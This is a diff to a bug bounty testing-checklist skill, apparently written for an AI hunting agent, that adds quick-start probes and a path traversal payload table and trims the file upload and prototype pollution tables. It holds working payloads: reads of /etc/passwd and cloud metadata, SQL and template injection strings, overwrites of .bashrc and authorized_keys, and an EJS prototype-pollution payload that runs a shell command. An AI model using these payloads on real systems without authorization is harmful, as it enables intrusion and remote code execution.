@@ -7,6 +7,18 @@ description: Testing patterns and checklists for web vulnerability classes that 
 
 Concrete testing patterns for the vulnerability classes that pay bounties. Not theory — actionable test cases you can run against a target right now.
 
+## Quick Start — First 5 Minutes
+
+1. **IDOR** — Swap any user-controlled ID between two accounts (numeric, UUID, slug). Check GET, PUT, DELETE.
+2. **Auth bypass** — Call admin/paid endpoints with a low-priv token. Try `/api/v1/` if `/api/v2/` is blocked.
+3. **SSRF** — Any URL input (webhook, import, preview)? Send `http://169.254.169.254/latest/meta-data/`.
+4. **Path traversal** — Any file download/export/view endpoint? Send `../../../etc/passwd` in the filename parameter.
+5. **Injection** — Search/sort/filter params: `' OR 1=1--` (SQL), `{{7*7}}` (SSTI), `${7*7}` (EL).
+
+If you have a hit, run `/reportability-check` before `/write-report`. If blocked or it looks patched, run `/variant-hunt`.
+
+---
+
 ## Routing Index
 
 For deep dives, route to the specialized skill or reference file:
@@ -184,6 +196,34 @@ Not all vulnerability classes are equal. Autonomous tools (XBOW, Shannon, Codex 
 
 ---
 
+### Path Traversal / Arbitrary File Read-Write (CWE-22 / CWE-73)
+
+**What it is:** Reading or writing files outside the intended directory by manipulating file path parameters.
+
+**Where to look:** File download/export/view endpoints, archive extraction (Zip Slip), template/include parameters, file import features, log viewers, backup/restore, config editors, any parameter accepting a filename or path.
+
+**Test patterns:**
+
+| # | Test | Payload | Target |
+|---|------|---------|--------|
+| 1 | Basic traversal | `../../../etc/passwd` | Download/export filename param |
+| 2 | URL-encoded | `..%2F..%2F..%2Fetc%2Fpasswd` | WAF bypass |
+| 3 | Double-encoded | `..%252F..%252F..%252Fetc%252Fpasswd` | Double-decode bypass |
+| 4 | Fullwidth slash | `..%EF%BC%8F..%EF%BC%8Fetc%EF%BC%8Fpasswd` | Unicode normalization bypass |
+| 5 | Null byte | `../../../etc/passwd%00.png` | Truncation bypass (legacy) |
+| 6 | Windows separator | `..\..\..\..\windows\win.ini` | Windows targets |
+| 7 | Absolute path | `/etc/passwd` (replace relative path entirely) | Missing relative-only check |
+| 8 | Zip Slip | Archive with `../../shell.php` entry | Archive extraction |
+| 9 | Symlink traversal | Archive containing symlink to `/etc/passwd` | Archive extraction |
+| 10 | Template/include | `file=../../config/database.yml` | Template/include params |
+| 11 | Write-path overwrite | `filename=../../../.bashrc` or `../.ssh/authorized_keys` | File upload with path control |
+
+**Bypasses when blocked:** Dot-only filters: use `....//` (nested), `..;/` (Tomcat), `.//..//`. Extension filters: null byte, trailing dot, alternate data stream (Windows `::$DATA`). WAF: Unicode normalization (fullwidth, overlong UTF-8). Canonicalization: see [parser-differentials.md](reference/parser-differentials.md).
+
+**Recent CVEs:** CVE-2026-27825 (mcp-atlassian, CVSS 9.1) — path traversal to overwrite `~/.bashrc` or `~/.ssh/authorized_keys` via Confluence page download, unauthenticated RCE. Endor Labs: 82% of 2,614 MCP implementations vulnerable to CWE-22.
+
+---
+
 ### Authentication & Session
 
 **What it is:** Bypassing login, session management, or identity verification.
@@ -316,31 +356,17 @@ Not all vulnerability classes are equal. Autonomous tools (XBOW, Shannon, Codex 
 
 **What it is:** Exploiting file upload functionality to achieve code execution, XSS, or data exfiltration.
 
-**Where to look:**
-- Profile image upload
-- Document/attachment upload
-- Import functionality
-- Any file upload endpoint
-
-**Test patterns:**
+**Where to look:** Profile images, document uploads, import features, any file upload endpoint.
 
 | # | Test | Method | Goal |
 |---|------|--------|------|
-| 1 | Extension bypass | Upload `.php.jpg`, `.php%00.jpg` | Code execution |
-| 2 | Content-type mismatch | Set image/jpeg but send PHP content | Bypass MIME check |
-| 3 | SVG with script | Upload SVG containing `<script>` | Stored XSS |
-| 4 | HTML upload | Upload `.html` file with JavaScript | Stored XSS |
-| 5 | Path traversal | Filename: `../../../etc/passwd` | File overwrite |
-| 6 | Double extension | `file.php.png` | Server processes first extension |
-| 7 | Case variation | `.PHP`, `.pHp` | Bypass case-sensitive filters |
-| 8 | Polyglot file | Valid image with embedded PHP | Bypass image validation |
-| 9 | XXE via file | Upload XML/DOCX with XXE payload | Internal file read |
-| 10 | Size limits | Upload extremely large file | DoS or buffer overflow |
-| 11 | Zero-width space | Filename with U+200B: `shell.ph​p.png` | Extension filter bypass (stripped at storage → webshell) |
-
-**Recent file upload CVEs:**
-- **CVE-2025-52691** (SmarterMail): insecure file upload → unauthenticated RCE. Webmail appliances as persistent access vectors
-- **CVE-2026-28289** (FreeScout, CVSS 10.0): zero-click RCE via email attachment with U+200B zero-width space in filename; bypasses extension validation but stripped at storage → webshell. Pattern: invisible Unicode chars in filenames generalize to all upload systems
+| 1 | Extension bypass | `.php.jpg`, `.php%00.jpg`, double extension `.php.png` | Code execution |
+| 2 | Content-type mismatch | Set `image/jpeg` but send PHP content | Bypass MIME check |
+| 3 | SVG/HTML XSS | Upload SVG with `<script>` or `.html` with JS | Stored XSS |
+| 4 | Path traversal | Filename: `../../../etc/passwd` (see Path Traversal section above) | File overwrite |
+| 5 | Polyglot file | Valid image with embedded PHP | Bypass image validation |
+| 6 | XXE via file | Upload XML/DOCX with XXE payload | Internal file read |
+| 7 | Zero-width space | Filename with U+200B: `shell.ph​p.png` (CVE-2026-28289, CVSS 10.0) | Extension filter bypass → webshell |
 
 ---
 
@@ -406,18 +432,15 @@ Not all vulnerability classes are equal. Autonomous tools (XBOW, Shannon, Codex 
 
 **What it is:** Modifying JavaScript object prototypes to affect application behavior across the entire runtime.
 
-**Where to look:** APIs accepting deeply nested JSON, object merge/extend ops (lodash `merge`, `defaultsDeep`), GraphQL mutations with nested inputs, config endpoints accepting arbitrary key-value pairs.
+**Where to look:** APIs accepting deeply nested JSON, object merge/extend ops (lodash `merge`, `defaultsDeep`), GraphQL mutations with nested inputs, config endpoints.
 
 | # | Test | Payload | What to look for |
 |---|------|---------|-----------------|
-| 1 | Basic pollution | `{"__proto__":{"admin":true}}` | Privilege escalation, role bypass |
-| 2 | Constructor pollution | `{"constructor":{"prototype":{"isAdmin":true}}}` | Bypasses `__proto__` filtering |
-| 3 | Nested pollution | `{"a":{"__proto__":{"polluted":"yes"}}}` | Deep merge vulnerability |
-| 4 | Array pollution | `{"__proto__":{"length":1000000}}` | DoS via resource exhaustion |
-| 5 | Template pollution | `{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id')//"}}` | RCE via EJS template engine |
-| 6 | Server-side pollution → XSS | Pollute a rendering property used by the view engine | Reflected prototype pollution to XSS |
+| 1 | Basic | `{"__proto__":{"admin":true}}` | Privilege escalation |
+| 2 | Constructor | `{"constructor":{"prototype":{"isAdmin":true}}}` | Bypasses `__proto__` filter |
+| 3 | Template RCE | `{"__proto__":{"outputFunctionName":"x;require('child_process').execSync('id')//"}}` | RCE via EJS |
 
-**Impact escalation:** Prototype pollution alone is often Medium, but chains into RCE (via template engines), XSS (via rendering libraries), or privilege escalation (via auth checks on polluted properties).
+**Impact escalation:** Alone often Medium, but chains into RCE (template engines), XSS (rendering libs), or privesc (auth checks on polluted properties).
 
 ---
 
@@ -480,17 +503,6 @@ This skill uses progressive disclosure. Detailed reference material is available
 | [reference/web-vulns.md](reference/web-vulns.md) | GraphQL, JWT, OAuth/OIDC, rate limiting, n8n/workflow, edge framework, HTTP/3 race, React RSC | ~330 |
 | [reference/infrastructure-vulns.md](reference/infrastructure-vulns.md) | CSS exfil, Node.js bypass, SSRF chains, remote desktop, MDM, webmail RCE, critical infra, MotW bypass, new critical CVEs (MSHTML, SharePoint ToolShell, GoAnywhere, RoundCube, Langflow, WebView) | ~550 |
 
-**Quick search** — find specific vuln patterns without loading full files:
-```
-grep -n "MCP\|tool poisoning\|LPCI\|agentic\|prompt injection" ${CLAUDE_SKILL_DIR}/reference/ai-mcp-vulns.md
-grep -n "GraphQL\|JWT\|OAuth\|n8n\|workflow\|React RSC" ${CLAUDE_SKILL_DIR}/reference/web-vulns.md
-grep -n "SSRF\|MDM\|Ivanti\|MotW\|Chrome\|ICS\|appliance" ${CLAUDE_SKILL_DIR}/reference/infrastructure-vulns.md
-grep -n "CVE-\|CVSS\|bypass\|RCE\|escalation" ${CLAUDE_SKILL_DIR}/reference/infrastructure-vulns.md
-grep -n "parser\|canonical\|Unicode\|normalization\|SAML" ${CLAUDE_SKILL_DIR}/reference/parser-differentials.md
-```
-
----
-
-With target context from `target-recon`, patterns are tailored to the detected stack. Without context, you get the full checklist.
+**Quick search** — find patterns without loading full files: `grep -n "KEYWORD" ${CLAUDE_SKILL_DIR}/reference/<file>.md`
 
 **Related:** target-recon (stack ID), program-research (payout priorities), report-writing (writeups), ai-hunting (AI/LLM patterns).
